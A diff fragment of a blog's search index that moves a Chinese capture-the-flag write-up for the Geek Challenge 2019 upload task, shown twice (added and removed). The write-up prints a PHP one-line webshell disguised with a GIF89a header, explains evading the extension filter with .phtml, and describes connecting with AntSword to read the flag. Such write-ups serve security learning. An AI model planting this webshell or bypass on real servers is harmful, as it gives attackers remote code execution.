+    <title>极客大挑战 2019上传</title>
+    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
+    <content><![CDATA[<p>该题为上传木马题</p>
+<p>进入题目后，上传一句话木马</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
+<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
+<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
+<p>上传失败</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
+<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
+<p>上传后</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
+<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
+<p>链接成功</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
+<p>最后在根目录下得到flag</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>极客大挑战 2019 EasySQL</title>
     <url>/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/</url>
     <content><![CDATA[<p>打开题目如下</p>
@@ -1928,39 +2015,6 @@
 ]]></content>
       <tags>
         <tag>SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>极客大挑战 2019上传</title>
-    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
-    <content><![CDATA[<p>该题为上传木马题</p>
-<p>进入题目后，上传一句话木马</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
-<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
-<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
-<p>得到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
-<p>上传失败</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
-<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
-<p>上传后</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
-<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
-<p>链接成功</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
-<p>最后在根目录下得到flag</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
       </tags>
   </entry>
   <entry>
